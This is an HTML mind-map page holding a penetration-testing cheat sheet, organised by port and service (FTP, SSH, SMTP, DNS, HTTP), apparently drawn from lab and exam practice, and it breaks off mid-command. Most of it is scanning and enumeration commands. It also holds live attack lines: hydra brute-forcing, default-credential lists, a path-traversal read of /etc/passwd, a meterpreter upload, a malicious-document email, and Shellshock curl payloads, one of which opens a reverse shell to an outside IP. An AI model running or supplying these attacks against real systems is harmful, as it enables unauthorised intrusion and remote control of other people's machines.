<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<title>Markmap</title>
<style>
* {
  margin: 0;
  padding: 0;
}
#mindmap {
  display: block;
  width: 100vw;
  height: 100vh;
}
</style>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.28.0/themes/prism.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/markmap-toolbar@0.14.3/dist/style.css">
</head>
<body>
<svg id="mindmap"></svg>
<script src="https://cdn.jsdelivr.net/npm/d3@6.7.0"></script><script src="https://cdn.jsdelivr.net/npm/markmap-view@0.14.3"></script><script>(getMarkmap => {
        window.WebFontConfig = {
          custom: {
            families: ['KaTeX_AMS', 'KaTeX_Caligraphic:n4,n7', 'KaTeX_Fraktur:n4,n7', 'KaTeX_Main:n4,n7,i4,i7', 'KaTeX_Math:i4,i7', 'KaTeX_Script', 'KaTeX_SansSerif:n4,n7,i4', 'KaTeX_Size1', 'KaTeX_Size2', 'KaTeX_Size3', 'KaTeX_Size4', 'KaTeX_Typewriter']
          },
          active: () => {
            getMarkmap().refreshHook.call();
          }
        };
      })(() => window.markmap)</script><script src="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.js" defer></script><script src="https://cdn.jsdelivr.net/npm/markmap-toolbar@0.14.3/dist/index.umd.min.js"></script><script>(r => {
                setTimeout(r);
              })(() => {
  const {
    markmap,
    mm
  } = window;
  const toolbar = new markmap.Toolbar();
  toolbar.attach(mm);
  const el = toolbar.render();
  el.setAttribute('style', 'position:absolute;bottom:20px;right:20px');
  document.body.append(el);
})</script><script>((getMarkmap, getOptions, root, jsonOptions) => {
        const markmap = getMarkmap();
        window.mm = markmap.Markmap.create('svg#mindmap', (getOptions || markmap.deriveOptions)(jsonOptions), root);
      })(() => window.markmap,null,{"type":"heading","depth":0,"payload":{"lines":[1,2]},"content":"Ports &amp; Services","children":[{"type":"heading","depth":1,"payload":{"lines":[3,4]},"content":"21 » FTP","children":[{"type":"heading","depth":2,"payload":{"lines":[4,5]},"content":"Enumeration","children":[{"type":"heading","depth":3,"payload":{"lines":[5,6]},"content":"NMAP","children":[{"type":"list_item","depth":4,"payload":{"lines":[6,7]},"content":"<code>nmap -vv -p 20,21 -sT --script=ftp* $ip</code>"}]}]},{"type":"heading","depth":2,"payload":{"lines":[8,9]},"content":"Exploitation","children":[{"type":"heading","depth":3,"payload":{"lines":[9,10]},"content":"Connect to the FTP server:","children":[{"type":"list_item","depth":4,"payload":{"lines":[10,11]},"content":"<code>ftp $ip</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[12,13]},"content":"Try the following creds:","children":[{"type":"list_item","depth":4,"payload":{"lines":[13,14]},"content":"<code>anonymous:</code>"},{"type":"list_item","depth":4,"payload":{"lines":[14,15]},"content":"<code>anonymous:anonymous</code>"},{"type":"list_item","depth":4,"payload":{"lines":[15,16]},"content":"<code>ftp:ftp</code>"},{"type":"list_item","depth":4,"payload":{"lines":[16,17]},"content":"<code>ftp://username:password@ftp.xyz.com</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[18,19]},"content":"download binary files (ascii)","children":[{"type":"list_item","depth":4,"payload":{"lines":[19,20]},"content":"<code>get &lt;filename&gt;</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[21,22]},"content":"upload files (ascii)","children":[{"type":"list_item","depth":4,"payload":{"lines":[22,23]},"content":"<code>put &lt;filename&gt;</code>"}]}]}]},{"type":"heading","depth":1,"payload":{"lines":[25,26]},"content":"22 » SSH","children":[{"type":"heading","depth":2,"payload":{"lines":[26,27]},"content":"Enumeration","children":[{"type":"heading","depth":3,"payload":{"lines":[27,28]},"content":"nmap","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\"># Send default nmap scripts for SSH\n    nmap -p22 $ip -sC \n # Retrieve version\n    nmap -p22 $ip -sV\n# Retrieve supported algorythms \n    nmap -p22 $ip --script ssh2-enum-algos \nnmap -p22 $ip --script ssh-hostkey --script-args\n# Retrieve weak keys\nssh_hostkey=full \n# Check authentication methods\nnmap -p22 $ip --script ssh-auth-methods --script\u0002args=\"ssh.user=root\" \n</code></pre>\n"}]},{"type":"heading","depth":3,"payload":{"lines":[41,42]},"content":"nc","children":[{"type":"list_item","depth":4,"payload":{"lines":[42,43]},"content":"<code>nc -vn $ip 22</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[43,44]},"content":"ssh-keyscan","children":[{"type":"list_item","depth":4,"payload":{"lines":[44,45]},"content":"<code>ssh-keyscan -t rsa $ip -p &lt;PORT&gt;</code>"}]}]},{"type":"heading","depth":2,"payload":{"lines":[46,47]},"content":"Exploitation","children":[{"type":"heading","depth":3,"payload":{"lines":[47,48]},"content":"known bad keys","children":[{"type":"list_item","depth":4,"payload":{"lines":[48,49]},"content":"<code>https://github.com/rapid7/ssh-badkeys/tree/master/authorized</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[49,50]},"content":"crackmapexec","children":[{"type":"list_item","depth":4,"payload":{"lines":[50,51]},"content":"<code>crackmapexec ssh --help</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[51,52]},"content":"break out of jail","children":[{"type":"list_item","depth":4,"payload":{"lines":[52,53]},"content":"<code>ssh name@$ip /bin/bash</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[53,54]},"content":"brute force","children":[{"type":"list_item","depth":4,"payload":{"lines":[54,55]},"content":"<code>hydra -v -V -u -l {Username} -P {Big_Passwordlist} -t 1 -u {IP} ssh</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[56,57]},"content":"Do you have UPLOAD potential?","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\"># Can you trigger execution of uploads?\n    - Upload file from FTP client to FTP server.\n    - After uploading files, FTP trigger is ignited.\n    - FTP trigger executes script\n\n# When trigger executes script, script can pass following information.\n    - Uploaded file path\n    - Uploaded file name\n - FTP user name who uploaded file.\n\n» **NOTE:** May need to Swap binaries.\n</code></pre>\n"}]},{"type":"heading","depth":3,"payload":{"lines":[71,72]},"content":"Check for Vulnerabilities in version / RCE? /"},{"type":"heading","depth":3,"payload":{"lines":[73,74]},"content":"Brute Force service","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-shell\"><code class=\"language-shell\">hydra <span class=\"token parameter variable\">-C</span> /usr/share/seclist/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://10.2.2.31 \n</code></pre>\n"}]},{"type":"heading","depth":3,"payload":{"lines":[79,80]},"content":"More Tools","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">ssh-audit » https://github.com/jtesta/ssh-audit\nsshfuzz » https://packetstormsecurity.com/files/download/71252/sshfuzz.txt\n</code></pre>\n"}]}]}]},{"type":"heading","depth":1,"payload":{"lines":[85,86]},"content":"25,465,587 » SMTP","children":[{"type":"heading","depth":2,"payload":{"lines":[86,87]},"content":"Enumeration","children":[{"type":"heading","depth":3,"payload":{"lines":[87,88]},"content":"nmap","children":[{"type":"list_item","depth":4,"payload":{"lines":[88,89]},"content":"<code>nmap -p25 --script smtp-commands $ip</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[89,90]},"content":"nc","children":[{"type":"list_item","depth":4,"payload":{"lines":[90,91]},"content":"<code>nc -vn $ip 25</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[91,92]},"content":"disclosure - ntlm auth","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">telnet example.com 587\n>> HELO\n>> AUTH NTLM 334\n</code></pre>\n"}]},{"type":"heading","depth":3,"payload":{"lines":[97,98]},"content":"disclosure - internal server name","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">>> EHLO all\n>> MAIL FROM: me\n</code></pre>\n"}]},{"type":"heading","depth":3,"payload":{"lines":[102,103]},"content":"dig","children":[{"type":"list_item","depth":4,"payload":{"lines":[103,104]},"content":"<code>dig +short mx google.com</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[104,105]},"content":"smtp/s","children":[{"type":"list_item","depth":4,"payload":{"lines":[105,106]},"content":"<code>openssl s_client -crlf -connect smtp.mailgun.org:465</code>"},{"type":"list_item","depth":4,"payload":{"lines":[106,107]},"content":"<code>openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587</code>"}]}]},{"type":"heading","depth":2,"payload":{"lines":[108,109]},"content":"Exploitation","children":[{"type":"heading","depth":3,"payload":{"lines":[110,111]},"content":"sendEmail","children":[{"type":"list_item","depth":4,"payload":{"lines":[111,112]},"content":"deliver a pdf - <code>sendEmail -t pedro@thinc.local -f eric@thinc.local -s 10.11.1.229 -u statistics -a /home/kali/rdp_share/statistics.pdf</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[112,113]},"content":"swaks","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\"># deliver a .document \n    swaks --to itsupport@outdated.htb --from aceIzwild@pwned --server mail.outdated.htb --body \"http://10.10.14.10/maldoc.doc\"\n# deliver a standard test email\n    swaks --to [user@example.com](mailto:user@example.com) --server test-server.example.net\n# use CRAM-MD5 authentication\n    swaks --to [user@example.com](mailto:user@example.com) --from [me@example.com](mailto:me@example.com) --auth CRAM-MD5 --auth-user [me@example.com](mailto:me@example.com) --header-X-Test \"test email\"\n# test for AV\n    swaks -t [user@example.com](mailto:user@example.com) --attach - --server test-server.example.com --suppress-data &lt;/path/to/eicar.txt\n# Test a spam scanner\n    swaks --to [user@example.com](mailto:user@example.com) --body /path/to/gtube/file\n</code></pre>\n"}]},{"type":"heading","depth":3,"payload":{"lines":[125,126]},"content":"More Tools","children":[{"type":"list_item","depth":4,"payload":{"lines":[126,127]},"content":"serve - <code>https://github.com/vercel/serve</code>"}]}]}]},{"type":"heading","depth":1,"payload":{"lines":[129,130]},"content":"53 » DNS","children":[{"type":"heading","depth":2,"payload":{"lines":[130,131]},"content":"Enumeration","children":[{"type":"heading","depth":3,"payload":{"lines":[131,132]},"content":"nmap","children":[{"type":"list_item","depth":4,"payload":{"lines":[132,133]},"content":"<code>nmap -F --dns-server &lt;dns server ip&gt; &lt;target ip range&gt;</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[134,135]},"content":"whois","children":[{"type":"list_item","depth":4,"payload":{"lines":[135,136]},"content":"<code>whois domain.name</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[137,138]},"content":"dig","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\"># ENUMERATION\n    dig site.com\n    dig {a|txt|ns|mx} domain.com\n    dig {a|txt|ns|mx} domain.com @ns1.domain.com\n    dig axfr @dns-server domain.name\n    dig @10.10.10.10 -t NS domain.corp\n    dig @10.10.10.10 _gc.domain.corp\n    dig +nocmd shite.com MX +noall +answer\n    dig +nocmd site.com NS +noall +answer\n    dig +nocmd site.com A +noall +answer\n    dig site.com +nocmd AXFR +noall +answer @dns_server.com Zone\n\n# Aone Transfer\n    dig axfr @TheDNSServerYouWanToAsk domain\n    dig axfr blah.com @ns1.blah.com\n    dig a svcorp.com \n    dig txt svcorp.com \n    dig x svcorp.com \n</code></pre>\n"}]},{"type":"heading","depth":3,"payload":{"lines":[158,159]},"content":"host","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">host -t {a|txt|ns|mx} megacorpone.comhost -a megacorpone.comhost -l megacorpone.com ns1.megacorpone.com\nhost -t axfr domain.name dns-server\nhost -t axfr thinc.local $ip\nhost -t ns site.com\nhost -l site.com ns2.site.com\nhost -t mx site.com\n</code></pre>\n"}]},{"type":"heading","depth":3,"payload":{"lines":[168,169]},"content":"dnsrecon","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">dnsrecon -d site.com\ndnsrecon -d megacorpone.com -t axfr @ns2.megacorpone.com\ndnsrecon -d megacorpone.com -t axfr\ndnsrecon -d thinc.local -n $ip -t axfr -r 10.11.1.0/24\ndnsrecon -r 10.11.1.0/24 -n &lt;DNS IP>\ndnsrecon -d $ip -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml\ndnsrecon -d $ip -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml\n</code></pre>\n"}]},{"type":"heading","depth":3,"payload":{"lines":[179,180]},"content":"dnsenum","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">dnsenum svcorp.com\ndnsenum site.com –dnsserver ns1.site.com\ndnsenum site.com -f /root/hostlist.txt\n</code></pre>\n"}]},{"type":"heading","depth":3,"payload":{"lines":[186,187]},"content":"dnsmap","children":[{"type":"list_item","depth":4,"payload":{"lines":[187,188]},"content":"<code>dnsmap site.com</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[189,190]},"content":"nslookup","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">nslookup -> set type=any -> ls -d domain.com\nnslookup site.com  \nnslookup -query=mx site.com  \nnslookup -query=ns site.com  \nnslookup -query=any site.com\n\n# DNS Zone Transfers\n    nslookup set type=any -> ls -d blah.com\n</code></pre>\n"}]},{"type":"heading","depth":3,"payload":{"lines":[201,202]},"content":"bash script","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\"># Domain name Reverse Lookup brute force\n    for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v \"not found\"\n</code></pre>\n"}]}]},{"type":"heading","depth":2,"payload":{"lines":[207,208]},"content":"Exploitation"}]},{"type":"heading","depth":1,"payload":{"lines":[209,210]},"content":"69 » TFTP","children":[{"type":"heading","depth":2,"payload":{"lines":[210,211]},"content":"Enumeration"},{"type":"heading","depth":2,"payload":{"lines":[212,213]},"content":"Exploitation"}]},{"type":"heading","depth":1,"payload":{"lines":[216,217]},"content":"80,443 » Web / HTTP","children":[{"type":"heading","depth":2,"payload":{"lines":[217,218]},"content":"80 - INFO","children":[{"type":"fence","depth":3,"content":"<pre class=\"language-text\"><code class=\"language-text\">Assess the following:\n» Robots.txt\n» source code and comments  \n» check Parameters, Headers &amp; Cookies for SQL, XSS, LFI/ RFI \n» Common username:passowrd combinations for login &amp; admin pages:\n    admin:admin\n    administrator:administrator\n    test:test\n    user:user\n    user1:user1\n</code></pre>\n"},{"type":"heading","depth":3,"payload":{"lines":[230,231]},"content":"Good2Know","children":[{"type":"list_item","depth":4,"payload":{"lines":[231,232]},"content":"Note the subdomain can't be found with dirbuster wordlists"},{"type":"list_item","depth":4,"payload":{"lines":[232,233]},"content":"grep staging-order /usr/share/dirbuster/wordlists/"}]}]},{"type":"heading","depth":2,"payload":{"lines":[234,235]},"content":"Enumeration","children":[{"type":"heading","depth":3,"payload":{"lines":[236,237]},"content":"https"},{"type":"heading","depth":3,"payload":{"lines":[239,240]},"content":"html error codes","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">- 1xx informational response – the request was received, continuing process\n- 2xx successful – the request was successfully received, understood, and accepted\n- 3xx redirection – further action needs to be taken in order to complete the request\n- 4xx client error – the request contains bad syntax or cannot be fulfilled\n- 5xx server error – the server failed to fulfil an apparently valid request\n</code></pre>\n"}]},{"type":"heading","depth":3,"payload":{"lines":[248,249]},"content":"Nmap Scanning for Web Service (HTTP/HTTPS)","children":[{"type":"list_item","depth":4,"payload":{"lines":[249,250]},"content":"scanning for Web Service - <code>nmap -PN -p 22 --open -oG - 10.11.1. | awk '$NF~/ssh/{print $2}'</code>"},{"type":"list_item","depth":4,"payload":{"lines":[250,251]},"content":"scanning for Web Service - <code>nmap 10.11.1. -p22,80 --open -oG - | awk '/22\\/open.80\\/open/{print $2}'</code>"},{"type":"list_item","depth":4,"payload":{"lines":[251,252]},"content":"scanning for Web Service - <code>nmap 10.11.1. -p80,8080 --open -oG - | awk '/80\\/open.8080\\/open/{print $2}</code>"},{"type":"list_item","depth":4,"payload":{"lines":[252,253]},"content":"scanning for Web Service - <code>nmap -p 80,8080 10.11.1.1-255</code>"},{"type":"list_item","depth":4,"payload":{"lines":[253,254]},"content":"scanning for Web Service - <code>nmap -A -p 22,80,443 office.paper --script vuln -T4 -vvv</code>"},{"type":"list_item","depth":4,"payload":{"lines":[254,255]},"content":"HTTP Form Fuzzer - <code>nmap --script http-form-fuzzer --script-args 'http-form-fuzzer.targets={1={path=/},2={path=/register.html}}'-p 80 $ip</code>"},{"type":"list_item","depth":4,"payload":{"lines":[255,256]},"content":"using the PUT method - <code>nmap -sV --script http-put --script-args http-put.url=’/test/meterpreter4444.php’,http-put.file=’/root/Exam0119/pwd/192.168.111.149/meterpreter4444.php’ -p 80 192.168.111.149</code>"},{"type":"list_item","depth":4,"payload":{"lines":[256,257]},"content":"use scripts - <code>nmap –script http-methods –script-args http-methods.url- path=’/uploads’,http-methods.test-all -p 8585 172.28.128.3</code>"},{"type":"list_item","depth":4,"payload":{"lines":[257,258]},"content":"use scripts <code>nmap --script dns-brute,http-backup-finder,http-config-backup,http-rfi-spider,http-brute,http-default-accounts,http-put,http-enum</code>"},{"type":"list_item","depth":4,"payload":{"lines":[258,259]},"content":"HTTP Enumeration with NMAP  - <code>nmap --script=http-enum -p80 -n $ip/24</code>"},{"type":"list_item","depth":4,"payload":{"lines":[259,260]},"content":"Check the server methods - <code>nmap --script http-methods --script-args http-methods.url-path='/test' $ip</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[261,262]},"content":"netcat","children":[{"type":"list_item","depth":4,"payload":{"lines":[262,263]},"content":"banner grabbing - <code>nc $ip &lt;port&gt;</code>"},{"type":"list_item","depth":4,"payload":{"lines":[263,264]},"content":"banner grabbing - <code>echo -e 'GET / HTTP/1.1\\r\\n' | nc $RHOST $RPORT</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[265,266]},"content":"nikto","children":[{"type":"blockquote","depth":4,"payload":{"lines":[266,267]},"content":""},{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">edit /etc/nikto.conf for the user agent\nUSERAGENT=Mozilla/5.00 (Nikto/@VERSION) (Evasions:@EVASIONS) (Test:@TESTID)\n</code></pre>\n"},{"type":"bullet_list","depth":4,"payload":{"lines":[272,286]},"content":"","children":[{"type":"list_item","depth":5,"payload":{"lines":[272,273]},"content":"basic scan - <code>nikto -h $ip</code>"},{"type":"list_item","depth":5,"payload":{"lines":[273,274]},"content":"HTTP - <code>nikto -h &lt;IP or hostname&gt; -Format+ txt</code>"},{"type":"list_item","depth":5,"payload":{"lines":[274,275]},"content":"HTTPS - <code>nikto -h &lt;IP or hostname&gt; -ssl -Format+ txt</code>"},{"type":"list_item","depth":5,"payload":{"lines":[275,276]},"content":"use Target.txt file - <code>nikto -h targetIP.txt</code>"},{"type":"list_item","depth":5,"payload":{"lines":[276,277]},"content":"discover vulnerability &amp; pair it with a weaponized exploit - <code>nikto -h &lt;IP or hostname&gt; -Format msf+</code>"},{"type":"list_item","depth":5,"payload":{"lines":[277,278]},"content":"scan for SQLi Vulnerabilities - <code>nikto -Tuning 9 -h &lt;IP or hostname&gt;</code>"},{"type":"list_item","depth":5,"payload":{"lines":[278,279]},"content":"Scan for everything exemp DOS - `nikto -Tuning x 6 -h <IP or hostname>'"},{"type":"list_item","depth":5,"payload":{"lines":[279,280]},"content":"scan through a Proxy - `nikto -host http://10.11.1.44:8000'"},{"type":"list_item","depth":5,"payload":{"lines":[280,281]},"content":"useproxy - <code>nikto -h 192.168.100.163 --useproxy http://192.168.100.163:3128</code>"},{"type":"list_item","depth":5,"payload":{"lines":[281,282]},"content":"Save scan results to a file - <code>nikto -Display V -o results.html -Format htm -Tuning x 6 -h &lt;IP or hostname&gt;</code>"},{"type":"list_item","depth":5,"payload":{"lines":[282,283]},"content":"example - <code>nikto -host &quot;http://10.13.38.21:5985&quot; | tee &quot;recon/nikto_10.13.38.21_5985.txt&quot;</code>"},{"type":"list_item","depth":5,"payload":{"lines":[283,284]},"content":"example - <code>nikto -Display V -o results.html -Format txt -Tuning x 6 -h &lt;IP or hostname&gt;</code>"},{"type":"list_item","depth":5,"payload":{"lines":[284,285]},"content":"example - <code>nikto -C all -h http://10.11.1.72&quot;</code>"},{"type":"list_item","depth":5,"payload":{"lines":[285,286]},"content":"example - <code>nikto -host 10.10.10.10[:8080] -output nikto.[name].txt</code>"}]}]},{"type":"heading","depth":3,"payload":{"lines":[288,289]},"content":"enum site","children":[{"type":"list_item","depth":4,"payload":{"lines":[289,290]},"content":"<code>wget https://site.local -o foo-bar</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[292,293]},"content":"curl","children":[{"type":"list_item","depth":4,"payload":{"lines":[293,294]},"content":"basic use - <code>curl -i -L 10.11.1.71</code>"},{"type":"list_item","depth":4,"payload":{"lines":[294,295]},"content":"https - <code>curl -I $URL -k</code>"},{"type":"list_item","depth":4,"payload":{"lines":[295,296]},"content":"https - <code>curl -v $URL -i -H &quot;Range: bytes=0-1023&quot; -k</code>"},{"type":"list_item","depth":4,"payload":{"lines":[296,297]},"content":"Upload Files - <code>curl -F ‘data=@path/to/local/file’ UPLOAD_ADDRESS</code>"},{"type":"list_item","depth":4,"payload":{"lines":[297,298]},"content":"example - <code>curl -F 'img_avatar=@/home/petehouston/hello.txt' http://localhost/upload</code>"},{"type":"list_item","depth":4,"payload":{"lines":[298,299]},"content":"Upload multiple files - <code>curl -F 'fileX=@/path/to/fileX' -F 'fileY=@/path/to/fileY' ... http://localhost/upload</code>"},{"type":"list_item","depth":4,"payload":{"lines":[299,300]},"content":"Upload an array of files - <code>curl -F 'files[]=@/path/to/fileX' -F 'files[]=@/path/to/fileY' ... http://localhost/upload</code>"},{"type":"list_item","depth":4,"payload":{"lines":[300,302]},"content":"You send off an HTTP upload using the -T option with the file to upload:<br>\n<code>curl -T uploadthis http://example.com/</code>"},{"type":"list_item","depth":4,"payload":{"lines":[302,303]},"content":"robots.txt - curl 10.11.1.71/robots.txt -s | html2text`"},{"type":"list_item","depth":4,"payload":{"lines":[303,304]},"content":"cgi - <code>curl -i http://10.11.1.71/cgi-bin/admin.cgi</code>"},{"type":"list_item","depth":4,"payload":{"lines":[304,305]},"content":"cgi - <code>curl -i http://10.11.1.71/cgi-bin/admin.cgi -s | html2text</code>"},{"type":"list_item","depth":4,"payload":{"lines":[305,306]},"content":"cgi - <code>curl -i http://10.11.1.71/cgi-bin/test.cgi -s &gt; test.cgi.txt</code>"},{"type":"list_item","depth":4,"payload":{"lines":[306,307]},"content":"cgi - <code>curl 'http://10.11.1.71/cgi-bin/admin.cgi' -i -s &gt; before</code>"},{"type":"list_item","depth":4,"payload":{"lines":[307,308]},"content":"cgi - <code>curl 'http://10.11.1.71/cgi-bin/admin.cgi?list=../../../../../../../../../../etc/passwd' -i -s &gt; after</code>"},{"type":"list_item","depth":4,"payload":{"lines":[308,309]},"content":"cgi - <code>curl -H 'User-Agent: () { :; }; echo &quot;CVE-2014-6271 vulnerable&quot; bash -c id' http://10.11.1.71/cgi-bin/admin.cgi</code>"},{"type":"list_item","depth":4,"payload":{"lines":[309,310]},"content":"cgi - <code>curl -H &quot;user-agent: () { :; }; echo; echo; /bin/bash -c 'ls /home/root'&quot; \\http://10.11.1.71/cgi-bin/user.sh</code>"},{"type":"list_item","depth":4,"payload":{"lines":[310,311]},"content":"cgi - <code>curl http://10.11.1.71/cgi-bin/admin.cgi -s &gt; before</code>"},{"type":"list_item","depth":4,"payload":{"lines":[311,312]},"content":"cgi - <code>curl -H 'User-Agent: () { :; }; echo &quot;CVE-2014-6271 vulnerable&quot; bash -c id' http://10.11.1.71/cgi-bin/admin.cgi -s &gt; after diff before after</code>"},{"type":"list_item","depth":4,"payload":{"lines":[312,313]},"content":"robots.txt - <code>curl -i $ip robots.txt</code>"},{"type":"list_item","depth":4,"payload":{"lines":[313,314]},"content":"302 Error Eumeration - <code>curl -L http://sourceforge.net/projects/sofastatistics/files/latest/download?source=files -o foo.deb</code>"},{"type":"list_item","depth":4,"payload":{"lines":[314,315]},"content":"Get Options available from web server - <code>curl -vX OPTIONS vm/test</code>"},{"type":"list_item","depth":4,"payload":{"lines":[315,316]},"content":"chain 2 commands together - <code>curl -H &quot;User-Agent: () { :; }; bash -c 'echo aaaa; uname -a; echo zzzz;'&quot; http://10.11.1.71/cgi-bin/admin.cgi</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[317,318]},"content":"Curl and Netcat","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">By using the \"whereis\" command, we can check to see if there is a match in the $PATH folders. \nThis is used for programs to be executed (so you can do \"nc\" rather than \"/bin/nc\")`\n</code></pre>\n"},{"type":"bullet_list","depth":4,"payload":{"lines":[322,324]},"content":"","children":[{"type":"list_item","depth":5,"payload":{"lines":[322,323]},"content":"<code>curl -H &quot;User-Agent: () { :; }; /bin/bash -c 'echo aaaa; nc -h 2&gt;&amp;1; echo zzzz;'&quot; http://10.11.1.71/cgi-bin/admin.cgi -s \\ | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'</code>"},{"type":"list_item","depth":5,"payload":{"lines":[323,324]},"content":"<code>curl -H &quot;User-Agent: () { :; }; /bin/bash -c 'echo aaaa; bash -i &gt;&amp; /dev/tcp/192.168.119.127/443 0&gt;&amp;1; echo zzzz;'&quot; \\ http://10.11.1.71/cgi-bin/admin.cgi -s | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'</code>"}]}]},{"type":"heading","depth":3,"payload":{"lines":[326,327]},"content":"Cewl site &amp; generate wordlist","children":[{"type":"bullet_list","depth":4,"payload":{"lines":[327,329]},"content":"","children":[{"type":"list_item","depth":5,"payload":{"lines":[327,328]},"content":"<code>cewl $url -m 6 -w results.txt</code>"},{"type":"list_item","depth":5,"payload":{"lines":[328,329]},"content":"depth=2,wordLength=5 - <code>cewl -d 2 -m 5 -w results.txt $url</code>"}]},{"type":"blockquote","depth":4,"payload":{"lines":[329,330]},"content":"","children":[{"type":"paragraph","depth":5,"payload":{"lines":[329,330]},"content":"test file - wc -l results.txt"}]}]},{"type":"heading","depth":3,"payload":{"lines":[331,332]},"content":"Wordlists","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">/seclists/Discovery/Web_Content/common.txt\n/usr/share/wordlists/dirb/common.txt\n/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt\n/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt \n/user/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \n</code></pre>\n"}]},{"type":"heading","depth":3,"payload":{"lines":[340,341]},"content":"Content Discovery | feroxBuster","children":[{"type":"fence","depth":4,"content":"<pre class=\"language-text\"><code class=\"language-text\">Examples and demonstrations of all features\n    https://epi052.github.io/feroxbuster-docs/docs/examples/\n</code></pre>\n"},{"type":"bullet_list","depth":4,"payload":{"lines":[345,361]},"content":"","children":[{"type":"list_item","depth":5,"payload":{"lines":[345,346]},"content":"specif aspx extention - <code>feroxbuster -u $url -x aspx -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt</code>"},{"type":"list_item","depth":5,"payload":{"lines":[346,347]},"content":"specifying extensions - <code>feroxbuster -u $url -x pdf -x js,html -x php txt json,docx</code>"},{"type":"list_item","depth":5,"payload":{"lines":[347,348]},"content":"IIS - <code>feroxbuster -u $url -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt</code>"},{"type":"list_item","depth":5,"payload":{"lines":[348,349]},"content":"multiple Headers - <code>./feroxbuster -u $url -H Accept:application/json &quot;Authorization: Bearer {token}&quot;</code>"},{"type":"list_item","depth":5,"payload":{"lines":[349,350]},"content":"IPv6  - <code>feroxbuster -u http://[::1] --no-recursion -vv</code>"},{"type":"list_item","depth":5,"payload":{"lines":[350,351]},"content":"read url from STDIN &amp; pipe resulting urls to another tool <code>cat targets | feroxbuster --stdin --silent -s 200 301 302 --redirects -x js | fff -s 200 -o js-files</code>"},{"type":"list_item","depth":5,"payload":{"lines":[351,352]},"content":"proxy traffic via Burp - <code>feroxbuster -u $url --insecure --proxy http://127.0.0.1:8080</code>"},{"type":"list_item","depth":5,"payload":{"lines":[352,353]},"content":"proxy traffic through a SOCKS proxy - <code>feroxbuster -u $url --proxy socks5h://127.0.0.1:9050</code>"},{"type":"list_item","depth":5,"payload":{"lines":[353,354]},"content":"Pass auth token - <code>feroxbuster -u $url --query token=0123456789ABCDEF</code>"},{"type":"list_item","depth":5,"payload":{"lines":[354,355]},"content":"extract links and dig - <code>feroxbuster -u $url --extract-links</code>"},{"type":"list_item","depth":5,"payload":{"lines":[355,356]},"content":"make some noise - <code>feroxbuster -u $url -threads 200</code>"},{"type":"list_item","depth":5,"payload":{"lines":[356,357]},"content":"slow it down - <code>feroxbuster -u $url --threads 30 --scan-limit 2</code>"},{"type":"list_item","depth":5,"payload":{"lines":[357,358]},"content":"Send all 200/302 responses to a proxy - <code>feroxbuster -u $url --replay-proxy http://localhost:8080 --replay-codes 200 302 -insecure</code>"},{"type":"list_item","depth":5,"payload":{"lines":[358,360]},"content":"abort or reduce scan speed - <code>feroxbuster -u http://127.1 --auto-bail</code>feroxbuster -u http://127.1 --auto-tune`"}]}]},{"type":"heading","depth":3,"payload":{"lines":[361,362]},"content":"Content Discovery | gobuster","children":[{"type":"list_item","depth":4,"payload":{"lines":[362,363]},"content":"specify extentions - <code>gobuster dir -u http://search.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x 